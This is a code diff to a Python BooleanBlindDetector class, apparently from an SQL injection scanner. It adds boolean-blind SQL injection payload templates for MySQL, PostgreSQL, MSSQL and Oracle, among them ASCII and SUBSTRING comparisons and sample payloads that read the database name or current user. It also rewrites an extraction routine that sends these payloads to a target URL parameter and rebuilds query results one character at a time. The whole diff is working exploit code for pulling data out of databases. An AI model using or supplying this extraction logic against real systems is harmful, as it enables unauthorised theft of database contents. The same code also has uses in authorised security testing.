@@ -66,27 +66,39 @@ class BooleanBlindDetector:
         ]
     }
     
-    # Extraction payloads for data retrieval
+    # Extraction payloads for data retrieval using behavioral inference (Boolean-based Blind SQLi)
+    # These payloads cause the application to behave differently if a tested condition is true or false
+    # Note: 'example' keys are for documentation/reference only and not used in extraction logic
     EXTRACTION_TEMPLATES = {
         'mysql': {
             'char_extraction': "' AND SUBSTRING({column},{position},1)='{char}'--",
+            'ascii_extraction': "' AND ASCII(SUBSTRING({column},{position},1))={ascii_code}--",
             'length_check': "' AND LENGTH({column})={length}--",
             'exists_check': "' AND EXISTS(SELECT 1 FROM {table} WHERE {condition})--",
+            # Documentation: Example from problem statement
+            'example': "' AND ASCII(SUBSTRING((SELECT database()),1,1))=68--"
         },
         'postgresql': {
             'char_extraction': "' AND SUBSTRING({column},{position},1)='{char}'--",
+            'ascii_extraction': "' AND ASCII(SUBSTRING({column},{position},1))={ascii_code}--",
             'length_check': "' AND LENGTH({column})={length}--",
             'exists_check': "' AND EXISTS(SELECT 1 FROM {table} WHERE {condition})--",
         },
         'mssql': {
             'char_extraction': "' AND SUBSTRING({column},{position},1)='{char}'--",
+            'ascii_extraction': "' AND ASCII(SUBSTRING({column},{position},1))={ascii_code}--",
             'length_check': "' AND LEN({column})={length}--",
             'exists_check': "' AND EXISTS(SELECT 1 FROM {table} WHERE {condition})--",
+            # Documentation: Example from problem statement
+            'example': "' AND ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=68--"
         },
         'oracle': {
             'char_extraction': "' AND SUBSTR({column},{position},1)='{char}'--",
+            'ascii_extraction': "' AND ASCII(SUBSTR({column},{position},1))={ascii_code}--",
             'length_check': "' AND LENGTH({column})={length}--",
             'exists_check': "' AND EXISTS(SELECT 1 FROM {table} WHERE {condition})--",
+            # Documentation: Example from problem statement
+            'example': "' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))=68--"
         },
     }
     
@@ -305,18 +317,20 @@ class BooleanBlindDetector:
     
     def extract_data_bit_by_bit(self, test_function, url: str, param: str,
                                param_type: str, query: str, db_type: str = 'mysql',
-                               max_length: int = 100, **kwargs) -> Optional[str]:
+                               max_length: int = 100, use_ascii: bool = True, **kwargs) -> Optional[str]:
         """
         Extract data using bit-by-bit (character-by-character) boolean technique.
+        Implements behavioral inference by testing conditions character-by-character.
         
         Args:
             test_function: Function to make test requests
             url: Target URL
             param: Vulnerable parameter
             param_type: Parameter type
-            query: SQL query to extract (e.g., '@@version', 'database()')
-            db_type: Database type
+            query: SQL query to extract (e.g., '@@version', 'database()', 'SELECT user FROM dual')
+            db_type: Database type (mysql, mssql, oracle, postgresql)
             max_length: Maximum length to extract
+            use_ascii: Use ASCII code comparison (faster) instead of character comparison
             **kwargs: Additional parameters
         
         Returns:
@@ -326,49 +340,95 @@ class BooleanBlindDetector:
             logger.warning("No boolean patterns established")
             return None
         
-        logger.info(f"Starting bit-by-bit extraction for: {query}")
+        logger.info(f"Starting bit-by-bit extraction for: {query} (ASCII mode: {use_ascii})")
         
         templates = self.EXTRACTION_TEMPLATES.get(db_type, self.EXTRACTION_TEMPLATES['mysql'])
-        charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-@:/() '
         
         extracted = ""
         
         for position in range(1, max_length + 1):
             found_char = None
             
-            for char in charset:
-                # Build extraction payload
-                if db_type == 'mysql':
-                    payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'--"
-                elif db_type == 'postgresql':
-                    payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'--"
-                elif db_type == 'mssql':
-                    payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'--"
-                elif db_type == 'oracle':
-                    payload = f"' AND SUBSTR(({query}),{position},1)='{char}'--"
-                else:
-                    payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'--"
-                
-                try:
-                    response = test_function(payload, param, param_type, **kwargs)
-                    if not response:
+            if use_ascii:
+                # Use ASCII code comparison (more efficient, testing ASCII 32-126 inclusive)
+                for ascii_code in range(32, 127):
+                    # Build ASCII-based extraction payload using template
+                    if 'ascii_extraction' in templates:
+                        payload = templates['ascii_extraction'].format(
+                            column=f"({query})",
+                            position=position,
+                            ascii_code=ascii_code
+                        )
+                    else:
+                        # Fallback to manual construction
+                        if db_type == 'mysql':
+                            payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))={ascii_code}--"
+                        elif db_type == 'mssql':
+                            payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))={ascii_code}--"
+                        elif db_type == 'oracle':
+                            payload = f"' AND ASCII(SUBSTR(({query}),{position},1))={ascii_code}--"
+                        else:
+                            payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))={ascii_code}--"
+                    
+                    try:
+                        response = test_function(payload, param, param_type, **kwargs)
+                        if not response:
+                            continue
+                        
+                        pattern = self.analyze_response(response)
+                        
+                        # Check if response matches "true" pattern (condition was true)
+                        matches_true = any(
+                            self.calculate_similarity(pattern, true_p) > self.similarity_threshold
+                            for true_p in self.true_responses
+                        )
+                        
+                        if matches_true:
+                            found_char = chr(ascii_code)
+                            logger.debug(f"Position {position}: found '{found_char}' (ASCII {ascii_code})")
+                            break
+                    
+                    except Exception as e:
+                        logger.debug(f"Extraction failed for ASCII {ascii_code}: {e}")
                         continue
-                    
-                    pattern = self.analyze_response(response)
-                    
-                    # Check if response matches "true" pattern
-                    matches_true = any(
-                        self.calculate_similarity(pattern, true_p) > self.similarity_threshold
-                        for true_p in self.true_responses
-                    )
-                    
-                    if matches_true:
-                        found_char = char
-                        break
+            else:
+                # Use character comparison (less efficient but sometimes necessary)
+                charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-@:/() '
                 
-                except Exception as e:
-                    logger.debug(f"Extraction failed for char '{char}': {e}")
-                    continue
+                for char in charset:
+                    # Build character-based extraction payload
+                    if db_type == 'mysql':
+                        payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'--"
+                    elif db_type == 'postgresql':
+                        payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'--"
+                    elif db_type == 'mssql':
+                        payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'--"
+                    elif db_type == 'oracle':
+                        payload = f"' AND SUBSTR(({query}),{position},1)='{char}'--"
+                    else:
+                        payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'--"
+                    
+                    try:
+                        response = test_function(payload, param, param_type, **kwargs)
+                        if not response:
+                            continue
+                        
+                        pattern = self.analyze_response(response)
+                        
+                        # Check if response matches "true" pattern
+                        matches_true = any(
+                            self.calculate_similarity(pattern, true_p) > self.similarity_threshold
+                            for true_p in self.true_responses
+                        )
+                        
+                        if matches_true:
+                            found_char = char
+                            logger.debug(f"Position {position}: found '{found_char}'")
+                            break
+                    
+                    except Exception as e:
+                        logger.debug(f"Extraction failed for char '{char}': {e}")
+                        continue
             
             if found_char:
                 extracted += found_char
